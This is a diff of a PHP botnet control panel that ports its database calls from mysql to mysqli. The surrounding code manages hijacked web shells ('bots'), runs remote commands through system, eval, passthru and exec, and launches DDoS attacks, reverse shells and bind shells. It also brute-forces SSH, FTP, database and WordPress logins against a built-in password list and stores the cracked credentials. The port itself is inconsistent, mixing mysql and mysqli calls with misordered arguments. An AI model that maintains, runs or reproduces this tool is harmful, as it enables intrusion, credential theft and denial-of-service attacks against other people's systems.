@@ -41,23 +41,23 @@ define('PWN_PHP_METHOD', 'system'); //Determine php function being used in PWN a
 
 function checksql() {
 if(CHECKSQL == 1) {
-$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
+$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
 if(!$conn) {
 	die('Could not connect to sql - '.mysql_error());
 } else {
-if (!mysql_select_db(SQL_DB)) {
+if (!mysqli_select_db($conn, SQL_DB)) {
     echo('[+] Looks like you\'re running quasi for first time! Enjoy.<br />');
     echo('[+] Creating database '.SQL_DB.'<br />');
-    mysql_query('CREATE DATABASE '.SQL_DB);
-    mysql_select_db(SQL_DB);
+    mysqli_query($conn,'CREATE DATABASE '.SQL_DB);
+    mysqli_select_db(SQL_DB);
 }
-if(mysql_num_rows(mysql_query('SHOW TABLES LIKE "bots"'))!=1) {
+if(mysqli_num_rows(mysqli_query($conn,'SHOW TABLES LIKE "bots"'))!=1) {
 	echo '[+] Creating tables';
-	mysql_query('CREATE TABLE bots(id MEDIUMINT NOT NULL AUTO_INCREMENT, url CHAR(200) NOT NULL, PRIMARY KEY (id))');
-    mysql_query('CREATE TABLE brute(id MEDIUMINT NOT NULL AUTO_INCREMENT, service CHAR(50) NOT NULL, credentials CHAR(255) NOT NULL, PRIMARY KEY (id))');
+	mysqli_query($conn,'CREATE TABLE bots(id MEDIUMINT NOT NULL AUTO_INCREMENT, url CHAR(200) NOT NULL, PRIMARY KEY (id))');
+    mysqli_query($conn,'CREATE TABLE brute(id MEDIUMINT NOT NULL AUTO_INCREMENT, service CHAR(50) NOT NULL, credentials CHAR(255) NOT NULL, PRIMARY KEY (id))');
 }
 }
-mysql_close($conn);
+mysqli_close($conn);
 }
 }
 
@@ -131,13 +131,13 @@ return $response;
 }
 
 function showbots() {
-$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysql_select_db(SQL_DB, $conn);
+$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysqli_select_db($conn,SQL_DB );
 
-$data = mysql_query("SELECT * FROM `bots`") or die("Shits fuckd up - ".mysql_error());
+$data = mysqli_query($conn,"SELECT * FROM `bots`") or die("Shits fuckd up - ".mysql_error());
 echo '<table style="width: 60%; margin-left: auto; margin-right: auto; border-spacing: 5px;">';
 echo '<tr><td><b>ID</b></td><td><b>URL</b></td><td><b>DDOS</b></td><td><b>STATUS</b></td></tr>';
-while($row = mysql_fetch_assoc($data)) {
+while($row = mysqli_fetch_assoc($data)) {
     
 $source = conn($row['url'].'?_=system&__=uname');
 if(strpos($source, md5(666))) {
@@ -157,32 +157,32 @@ echo '</table>';
 
 if(isset($_POST['addurl'])) {
 
-if(mysql_query("INSERT INTO bots(url) VALUES ('".mysql_escape_string($_POST['addurl'])."')"))
+if(mysqli_query($conn,"INSERT INTO bots(url) VALUES ('".mysql_escape_string($_POST['addurl'])."')"))
 echo '<br/><p>Shell added - '.htmlspecialchars($_POST['addurl']).'</p>';
 } 
 elseif(isset($_POST['rmurl'])) {
 
-$check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['rmurl'])." LIMIT 1");
+$check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['rmurl'])." LIMIT 1");
 $row = mysql_fetch_array($check);
 if($row !== false) {
-if(mysql_query("DELETE FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['rmurl'])." LIMIT 1"))
+if(mysqli_query($conn,"DELETE FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['rmurl'])." LIMIT 1"))
 echo '<br/><p>Shell with id <b>'.htmlspecialchars($_POST['rmurl']).'</b> removed.</p>';
 } else { echo '<br/><p>Wrong shell ID ('.$_POST['rmurl'].')</p>'; }
 }
-mysql_close($conn);
+mysqli_close($conn);
 }
 
 function checkbots() {
 
 echo 'Count - ';
-$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysql_select_db(SQL_DB, $conn);
-$rows = mysql_query('SELECT * FROM `bots`', $conn);
-echo mysql_num_rows($rows);
+$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysqli_select_db($conn, SQL_DB);
+$rows = mysqli_query($conn,'SELECT * FROM `bots`');
+echo mysqli_num_rows($rows);
 echo ' &nbsp;&bull;&nbsp; Current hash - '.md5("#666#".date("h:d")).' &nbsp;&bull;&nbsp; Proxy - '. PROXY_IP.':'.PROXY_PORT.'</a></p></p>';
 echo '<table align="center"><tr><td><b>ID</b></td><td><b>URL</b></td><td><b>IP</b></td><td><b>STATUS</b></td><td><b>OS</b></td><td><b>RCE</b></td><td><b>PWN</b></td></tr>';
 $id = 0;
-while($row = mysql_fetch_assoc($rows)) {
+while($row = mysqli_fetch_assoc($rows)) {
 
 
 $source = conn($row['url'].'?_=system&__=uname');
@@ -201,7 +201,7 @@ echo '</tr>';
 
 }
 echo '</table> ';
-mysql_close($conn);
+mysqli_close($conn);
 
 }
 
@@ -233,9 +233,9 @@ function mysqlm() {
     $mysqldump = 0;
     }
 
-    $dbuser = mysql_query("SELECT USER();");
+    $dbuser = mysqli_query($conn,"SELECT USER();");
     $dbuzer = mysql_fetch_row($dbuser);
-    $dbdb = mysql_query("SELECT DATABASE();");
+    $dbdb = mysqli_query($conn,"SELECT DATABASE();");
     $dbd = mysql_fetch_row($dbdb);
 
     echo 'MySql version - <a href="http://www.cvedetails.com/version-search.php?vendor=Mysql&product=Mysql&version='.mysql_get_client_info().'">'.mysql_get_client_info().'</a><br />';
@@ -244,14 +244,14 @@ function mysqlm() {
     echo "Current database - ".$dbd[0]."<br />";
 
     echo '<br /><h2>Databases</h2><br />';
-    $res = mysql_query("SHOW DATABASES");
+    $res = mysqli_query($conn,"SHOW DATABASES");
 
-    while ($row = mysql_fetch_assoc($res)) {
+    while ($row = mysqli_fetch_assoc($res)) {
         echo $row['Database'] . "<br />";
     }
 
 
-    $link = mysql_connect('localhost', 'mysql_user', 'mysql_password');
+    $link = mysqli_connect('localhost', 'mysql_user', 'mysql_password');
     $db_list = mysql_list_dbs($link);
 
     while ($row = mysql_fetch_object($db_list)) {
@@ -271,7 +271,7 @@ function mysqlm() {
         echo '<br />An error has occurred - ' . mysql_error() ."<br />";
     }
     else {
-       echo "<br /><p>Tables for <b>".$_POST['db']."</b> (".mysql_num_rows($tabele)."):</p>";
+       echo "<br /><p>Tables for <b>".$_POST['db']."</b> (".mysqli_num_rows($tabele)."):</p>";
 
     while ($row = mysql_fetch_row($tabele)) {
         echo ' - '.$row[0]."<br />";
@@ -310,12 +310,12 @@ function mysqlm() {
 
      if(isset($_POST['query'])) {
      
-    $result = mysql_query($_POST['query']);
+    $result = mysqli_query($conn,$_POST['query']);
     if (!$result) {
         die('An error has occurred - ' . mysql_error());
     }
     echo "<br />";
-    while ($row = mysql_fetch_assoc($result)) {
+    while ($row = mysqli_fetch_assoc($result)) {
        
         foreach ($row as $key => $value) {
             echo $row[$key]." ";
@@ -325,7 +325,7 @@ function mysqlm() {
 
     }
 
-    mysql_close($conn);
+    mysqli_close($conn);
 
     } elseif(isset($_GET['host'], $_GET['login'], $_GET['pass']) && !$conn = mysql_pconnect($_GET['host'], $_GET['login'], $_GET['pass'])) {
     	echo '<p>An error occurred while connecting - ' . mysql_error().'</p>';
@@ -416,10 +416,10 @@ echo '<p>'.$quote.'</p>';
 
 function rce()
 {
-$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysql_select_db(SQL_DB, $conn);
+$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysqli_select_db(SQL_DB, $conn);
 if(isset($_POST['id']) && isset($_POST['cmd']) && isset($_POST['func'])) {
-$check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
+$check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
 $row = mysql_fetch_array($check);
 if($row !== false && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
 echo '</div></div><div class ="post"><h2 class="title"><a href="#">Results</a></h2><div class="entry">';
@@ -432,16 +432,16 @@ echo '<pre>'.htmlspecialchars($y[1]).'</pre>';
 echo '<br/><p>No shell found for id <b>'.htmlspecialchars($_POST['id']).'</b></p>';
 }
 }
-mysql_close($conn);
+mysqli_close($conn);
 }
 
 function pwn() {
                         if(isset($_POST['id']) && isset($_POST['os']))
                         {
 
-                            $conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-                            mysql_select_db(SQL_DB, $conn);
-                            $check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
+                            $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+                            mysqli_select_db(SQL_DB, $conn);
+                            $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
                             $row = mysql_fetch_array($check);
 
                             if(isset($_POST['os']) == 'linux' && $row[1] != NULL) {
@@ -714,13 +714,13 @@ function ddos() {
 
     if(isset($_POST['url']) && isset($_POST['time']) && isset($_POST['sup'])) {
 
-$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysql_select_db(SQL_DB, $conn);
-$rows = mysql_query('SELECT * FROM `bots`', $conn);
+$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysqli_select_db(SQL_DB, $conn);
+$rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);
 
 if($_POST['sup'] == 'kill') {
 $x = 0;
-while($row = mysql_fetch_assoc($rows)) {
+while($row = mysqli_fetch_assoc($rows)) {
 
 $source = conn($row['url'].'?_=system&__=uname');
 if(strpos($source, md5(666))) {
@@ -754,7 +754,7 @@ echo '<br /><p>Killed all actions for <b>'.$x.'</b> bots.</p>';
 
         } elseif($_POST['sup'] == 'attack') {
             $y = 0;
-            while($row = mysql_fetch_assoc($rows)) {
+            while($row = mysqli_fetch_assoc($rows)) {
 
 $source = conn($row['url'].'?_=system&__=uname');
 if(strpos($source, md5(666))) {
@@ -823,9 +823,9 @@ function dos() {
 
     if(isset($_POST['url1']) && isset($_POST['botid1']) && isset($_POST['time1']) && isset($_POST['sup'])) {
 
-$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysql_select_db(SQL_DB, $conn);
-$check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['botid1'])." LIMIT 1");
+$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysqli_select_db(SQL_DB, $conn);
+$check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['botid1'])." LIMIT 1");
 $row = mysql_fetch_array($check);
 if($row !== false) {
 
@@ -913,11 +913,11 @@ function run() {
 
 if(isset($_POST['cmd']) && isset($_POST['func'])) {
 
-$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysql_select_db(SQL_DB, $conn);
-$rows = mysql_query('SELECT * FROM `bots`', $conn);    
+$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysqli_select_db(SQL_DB, $conn);
+$rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);    
 
-while($row = mysql_fetch_assoc($rows)) {
+while($row = mysqli_fetch_assoc($rows)) {
 
 $source = conn($row['url'].'?_=system&__=uname');
 if(strpos($source, md5("#666#".date("h:d"))) && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
@@ -936,10 +936,10 @@ function reverse_shell() {
 
     if(isset($_POST['ip']) && isset($_POST['port']) && isset($_POST['func']) && isset($_POST['id'])) {
 
-    $conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-    mysql_select_db(SQL_DB, $conn);
+    $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+    mysqli_select_db(SQL_DB, $conn);
 
-    $check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
+    $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
     $row = mysql_fetch_array($check);
     if($row !== false) {
 
@@ -999,10 +999,10 @@ function bind_shell() {
 
         if(isset($_POST['bindpassword']) && isset($_POST['bindport']) && isset($_POST['bindid'])) {
 
-    $conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-    mysql_select_db(SQL_DB, $conn);
+    $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+    mysqli_select_db(SQL_DB, $conn);
 
-    $check = mysql_query("SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['bindid'])." LIMIT 1");
+    $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['bindid'])." LIMIT 1");
     $row = mysql_fetch_array($check);
     if($row !== false) {
 
@@ -1155,18 +1155,18 @@ foreach($exploits as $exploit) {
 
 function showbrute() {
 
-$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysql_select_db(SQL_DB, $conn);
+$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysqli_select_db($conn,SQL_DB );
 
 $ftp = 0;
 $ssh = 0;
 $dbs = 0;
 $www = 0;
 
-$data = mysql_query("SELECT * FROM `brute`") or die("Shits fuckd up - ".mysql_error());
+$data = mysqli_query($conn,"SELECT * FROM `brute`") or die("Shits fuckd up - ".mysql_error());
 echo '<table style="width: 60%; margin-left: auto; margin-right: auto; border-spacing: 5px;">';
 echo '<tr><td><b>ID</b></td><td><b>HOST</b></td><td><b>USER</b></td><td><b>PASS</b></td></tr>';
-while($row = mysql_fetch_assoc($data)) {
+while($row = mysqli_fetch_assoc($data)) {
 
 $x = explode(':', $row["credentials"]);
 $y = explode(':', $row["service"]);
@@ -1194,8 +1194,8 @@ echo '<br /><center>ftp - '.$ftp.' &nbsp;&bull;&nbsp; ssh - '.$ssh.' &nbsp;&bull
 function brute_ssh() {
 
 $passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
-$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysql_select_db(SQL_DB, $conn);
+$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysqli_select_db(SQL_DB, $conn);
 
     if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {
 
@@ -1233,7 +1233,7 @@ mysql_select_db(SQL_DB, $conn);
           $sshconn = ssh2_connect($_POST['shost'], 22);
           if(ssh2_auth_password($sshconn, $_POST['suser'], trim($haslo))) {
         echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":22', '".mysql_escape_string($_POST['suser']).":".mysql_escape_string($haslo)."')", $conn);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":22', '".mysql_escape_string($_POST['suser']).":".mysql_escape_string($haslo)."')", $conn);
         ssh2_exec($sshconn, 'exit');
           } else {
         echo " - <font color=\"#990000\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . "</font><br />";
@@ -1292,7 +1292,7 @@ mysql_select_db(SQL_DB, $conn);
           if(ssh2_auth_password($sshconn, $_POST['muser'], trim($haslo)))
           {
         echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['muser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":22', '".mysql_escape_string($_POST['muser']).":".mysql_escape_string($haslo)."')", $conn);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":22', '".mysql_escape_string($_POST['muser']).":".mysql_escape_string($haslo)."')", $conn);
         ssh2_exec($sshconn, 'exit');
         break;
           } else {
@@ -1311,15 +1311,15 @@ mysql_select_db(SQL_DB, $conn);
 
     }
 
-mysql_close($conn);
+mysqli_close($conn);
 
 }
 
 function brute_ftp() {
 
 $passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
-$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysql_select_db(SQL_DB, $conn);
+$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysqli_select_db(SQL_DB, $conn);
 
     if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {
 
@@ -1352,7 +1352,7 @@ mysql_select_db(SQL_DB, $conn);
 
         $ftpconn = ftp_connect($_POST['shost']);
         if(ftp_login($ftpconn, 'anonymous', '')) {
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":21', 'anonymous')", $conn);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":21', 'anonymous')", $conn);
         ssh2_exec($sshconn, 'exit');
             echo '<br /><font color="#009900">Anonymous login allowed!</font><br />';
             echo '<p>Files in directory '.ftp_pwd($ftpconn).' :</p> ';
@@ -1373,7 +1373,7 @@ mysql_select_db(SQL_DB, $conn);
                     $ftpconn = ftp_connect($_POST['shost']);
                         if(ftp_login($ftpconn, $_POST['suser'], $haslo)) {
         echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['suser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":21', '".mysql_escape_string($_POST['suser']).":".mysql_escape_string($haslo)."')", $conn);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":21', '".mysql_escape_string($_POST['suser']).":".mysql_escape_string($haslo)."')", $conn);
         ssh2_exec($sshconn, 'exit');            echo '<p>General info</p>';
             echo '<p>Current directory -</p> '.ftp_pwd($ftpconn).'<br />';
             echo '<p>Files in directory:</p> <br />';
@@ -1439,7 +1439,7 @@ mysql_select_db(SQL_DB, $conn);
                     $ftpconn = ftp_connect(long2ip($ip));
                         if(ftp_login($ftpconn, $_POST['muser'], $haslo)) {
         echo " - <font color=\"#009900\">" . htmlspecialchars($_POST['muser']) . ':' . htmlspecialchars($haslo) . " - Success!</font><br />";
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":21', '".mysql_escape_string($_POST['muser']).":".mysql_escape_string($haslo)."')", $conn);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":21', '".mysql_escape_string($_POST['muser']).":".mysql_escape_string($haslo)."')", $conn);
         ssh2_exec($sshconn, 'exit');            echo '<p>General info</p>';
             echo '<p>Current directory -</p> '.ftp_pwd($ftpconn).'<br />';
             echo '<p>Files in directory:</p> <br />';
@@ -1458,7 +1458,7 @@ mysql_select_db(SQL_DB, $conn);
         }
 
         if(ftp_login($ftpconn, 'anonymous', '')) {
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":21', 'anonymous')", $conn);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":21', 'anonymous')", $conn);
         ssh2_exec($sshconn, 'exit');
             echo '<br /><font color="#009900">Anonymous login allowed!</font><br />';
             echo '<p>Files in directory '.ftp_pwd($ftpconn).' :</p> ';
@@ -1479,15 +1479,15 @@ mysql_select_db(SQL_DB, $conn);
 
     }
 
-mysql_close($conn);
+mysqli_close($conn);
 
 }
 
 function brute_dbs() {
 
 $passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
-$connf = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysql_select_db(SQL_DB, $connf);
+$connf = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+mysqli_select_db(SQL_DB, $connf);
 
     if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {
 
@@ -1543,14 +1543,14 @@ mysql_select_db(SQL_DB, $connf);
         }
 
         foreach ($pwds as $haslo){
-        $conn = mysql_connect($_POST['shost'], $uzytkownik, $haslo);
+        $conn = mysqli_connect($_POST['shost'], $uzytkownik, $haslo);
             if ($conn)  {
         echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":3306', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":3306', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
 
-        $dbuser = mysql_query("SELECT USER();");
+        $dbuser = mysqli_query($conn,"SELECT USER();");
         $dbuzer = mysql_fetch_row($dbuser);
-        $dbdb = mysql_query("SELECT DATABASE();");
+        $dbdb = mysqli_query($conn,"SELECT DATABASE();");
         $dbd = mysql_fetch_row($dbdb);
         echo '<b>General info</b><br />';
         echo 'MySql version - <a href="http://www.cvedetails.com/version-search.php?vendor=Mysql&product=Mysql&version='.mysql_get_client_info().'">'.mysql_get_client_info().'</a><br />';
@@ -1558,13 +1558,13 @@ mysql_select_db(SQL_DB, $connf);
         echo 'Current user - '.$dbuzer[0].'<br />';
 
         echo '<br /><b>Databases</b><br />';
-        $res = mysql_query("SHOW DATABASES");
+        $res = mysqli_query($conn,"SHOW DATABASES");
 
-    while ($row = mysql_fetch_assoc($res)) {
+    while ($row = mysqli_fetch_assoc($res)) {
         echo $row['Database'] . "<br />";
     }
 
-        mysql_close($conn);
+        mysqli_close($conn);
         break;
             } else {
         echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
@@ -1594,7 +1594,7 @@ mysql_select_db(SQL_DB, $connf);
         $conn = pg_connect("host=".$_POST['shost']." user=".$uzytkownik." password=".$haslo);
             if ($conn)  {
         echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":5432', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":5432', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
         echo '<br /><b>General info</b><br />';
         echo 'Version - '.pg_version($conn).'<br />';
         echo 'Host - '.pg_host($conn).'<br />';
@@ -1628,7 +1628,7 @@ mysql_select_db(SQL_DB, $connf);
         $conn = mssql_connect($_POST['shost'], $uzytkownik, $haslo);
             if ($conn)  {
         echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":1433', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($_POST['shost']).":1433', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
         mssql_close($conn);
         break;
             } else {
@@ -1705,14 +1705,14 @@ mysql_select_db(SQL_DB, $connf);
         }
 
         foreach ($pwds as $haslo){
-        $conn = mysql_connect(long2ip($ip), $uzytkownik, $haslo);
+        $conn = mysqli_connect(long2ip($ip), $uzytkownik, $haslo);
             if ($conn)  {
         echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":3306', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":3306', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
 
-        $dbuser = mysql_query("SELECT USER();");
+        $dbuser = mysqli_query($conn,"SELECT USER();");
         $dbuzer = mysql_fetch_row($dbuser);
-        $dbdb = mysql_query("SELECT DATABASE();");
+        $dbdb = mysqli_query($conn,"SELECT DATABASE();");
         $dbd = mysql_fetch_row($dbdb);
         echo '<b>General info</b><br />';
         echo 'MySql version - <a href="http://www.cvedetails.com/version-search.php?vendor=Mysql&product=Mysql&version='.mysql_get_client_info().'">'.mysql_get_client_info().'</a><br />';
@@ -1720,13 +1720,13 @@ mysql_select_db(SQL_DB, $connf);
         echo 'Current user - '.$dbuzer[0].'<br />';
 
         echo '<br /><b>Databases</b><br />';
-        $res = mysql_query("SHOW DATABASES");
+        $res = mysqli_query($conn,"SHOW DATABASES");
 
-    while ($row = mysql_fetch_assoc($res)) {
+    while ($row = mysqli_fetch_assoc($res)) {
         echo $row['Database'] . "<br />";
     }
 
-        mysql_close($conn);
+        mysqli_close($conn);
         break;
             } else {
         echo "<font color=\"#990000\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . "</font><br />";
@@ -1756,7 +1756,7 @@ mysql_select_db(SQL_DB, $connf);
         $conn = pg_connect("host=".long2ip($ip)." user=".$uzytkownik." password=".$haslo);
             if ($conn)  {
         echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":5432', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":5432', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
         echo '<br /><b>General info</b><br />';
         echo 'Version - '.pg_version($conn).'<br />';
         echo 'Host - '.pg_host($conn).'<br />';
@@ -1790,7 +1790,7 @@ mysql_select_db(SQL_DB, $connf);
         $conn = mssql_connect(long2ip($ip), $uzytkownik, $haslo);
             if ($conn)  {
         echo "<p><font color=\"#009900\">" . htmlspecialchars($uzytkownik) . ':' . htmlspecialchars($haslo) . " - Success!</font></p>";
-        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":1433', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
+        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string(long2ip($ip)).":1433', '".mysql_escape_string($uzytkownik).":".mysql_escape_string($haslo)."')", $connf);
         mssql_close($conn);
         break;
             } else {
@@ -1810,7 +1810,7 @@ mysql_select_db(SQL_DB, $connf);
     echo '</div></div>';
 
     }
-    mysql_close($conn);
+    mysqli_close($conn);
 }
 
 function url_exists($strURL)
@@ -1846,8 +1846,8 @@ function RemoveLastSlash($host)
 function wp_brute() {
     if(isset($_POST['hosts']) && isset($_POST['passwords']) && isset($_POST['usernames']))
 {
-    $conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
-    mysql_select_db(SQL_DB, $conn);
+    $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+    mysqli_select_db(SQL_DB, $conn);
 
     $hosts = trim(filter($_POST['hosts']));
     $passwords = trim(filter($_POST['passwords']));
@@ -1899,7 +1899,7 @@ function wp_brute() {
                     {
                         $hxd = 1;
                         echo "<p>".$host." - Cracked! Username - <font color='#990000'>".$username."</font> & Password : <font color='#990000'>".$password."</font></p>";
-                        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($host).":80', '".mysql_escape_string($username).":".mysql_escape_string($password)."')", $conn);
+                        mysqli_query($conn,"INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($host).":80', '".mysql_escape_string($username).":".mysql_escape_string($password)."')", $conn);
                         ob_flush();flush();break;
                     }
                 }
@@ -1912,7 +1912,7 @@ function wp_brute() {
     }
     else {echo "<h2><font color='#990000'>All fields are required!</font></h3>";}
 }
-mysql_close($conn);
+mysqli_close($conn);
 }
 
 
